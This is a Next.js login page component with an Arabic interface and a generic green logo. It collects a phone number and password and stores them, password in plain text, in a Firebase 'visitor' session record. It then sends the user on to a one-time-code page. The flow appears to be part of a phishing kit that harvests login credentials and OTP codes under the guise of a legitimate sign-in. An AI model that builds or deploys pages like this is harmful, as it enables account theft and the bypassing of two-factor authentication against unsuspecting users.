"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { createVisitorSession, updateVisitorLogin } from "@/lib/visitor-actions"

export default function LoginPage() {
  const router = useRouter()
  const [phone, setPhone] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [sessionId, setSessionId] = useState("")
  const [docId, setDocId] = useState("")
  const [mounted, setMounted] = useState(false)

  useEffect(() => {
    setMounted(true)
    // Generate unique session ID
    const newSessionId = `visitor_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    setSessionId(newSessionId)
    
    // Create session in Firebase
    createVisitorSession(newSessionId).then((result) => {
      if (result.success && result.docId) {
        setDocId(result.docId)
        // Store in localStorage for subsequent pages
        localStorage.setItem("visitorSessionId", newSessionId)
        localStorage.setItem("visitorDocId", result.docId)
      }
    })
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!phone || !password || !docId) return

    setIsLoading(true)
    
    try {
      await updateVisitorLogin(docId, sessionId, phone, password)
      router.push("/visitor/otp")
    } catch (error) {
      console.error("Error:", error)
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div 
      className={`min-h-screen flex flex-col items-center justify-center px-5 transition-opacity duration-500 ${
        mounted ? "opacity-100" : "opacity-0"
      }`}
    >
      {/* Logo */}
      <div className="mb-8">
        <svg viewBox="0 0 100 100" className="w-20 h-20">
          <polygon points="10,10 80,10 70,25 20,25" fill="#22c55e" />
          <polygon points="10,35 60,35 50,50 10,50" fill="#22c55e" />
          <polygon points="10,60 40,60 30,75 10,75" fill="#22c55e" />
        </svg>
      </div>

      <h1 className="text-2xl text-white font-bold mb-8 text-center">تسجيل الدخول</h1>

      <form onSubmit={handleSubmit} className="w-full max-w-sm space-y-5">
        {/* Phone Input */}
        <div>
          <label className="block text-white/80 text-sm mb-2">رقم الهاتف</label>
          <input
            type="tel"
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            placeholder="05XXXXXXXX"
            className="w-full px-4 py-4 rounded-xl bg-white/10 text-white placeholder-white/40 border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all"
            dir="ltr"
            required
          />
        </div>

        {/* Password Input */}
        <div>
          <label className="block text-white/80 text-sm mb-2">كلمة المرور</label>
          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="********"
            className="w-full px-4 py-4 rounded-xl bg-white/10 text-white placeholder-white/40 border border-white/20 focus:border-green-500 focus:bg-white/15 outline-none transition-all"
            dir="ltr"
            required
          />
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={isLoading || !docId}
          className="w-full py-4 mt-4 rounded-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold text-lg shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {isLoading ? "جاري التحميل..." : "تسجيل الدخول"}
        </button>
      </form>

      {/* Forgot Password Link */}
      <button className="mt-6 text-white/60 text-sm hover:text-white transition-colors">
        نسيت كلمة المرور؟
      </button>
    </div>
  )
}
